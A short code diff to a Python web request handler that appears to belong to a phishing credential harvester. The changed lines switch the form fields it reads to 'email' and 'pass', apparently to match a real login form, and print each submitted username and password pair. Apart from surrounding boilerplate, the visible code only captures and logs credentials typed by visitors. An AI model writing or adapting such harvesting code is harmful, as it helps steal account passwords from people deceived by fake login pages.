@@ -69,9 +69,9 @@ class WebRequestHandler(BaseHTTPRequestHandler):
 
         )
 
-        username_or_phone_number = form.getvalue("username")
-        password = form.getvalue("password")
-        print(username_or_phone_number + ':' + password)
+        username_or_phone_number = str(form.getvalue("email"))
+        password = str(form.getvalue("pass"))
+        print(username_or_phone_number + ":" + password)
 
     def get_response(self):
         return json.dump(
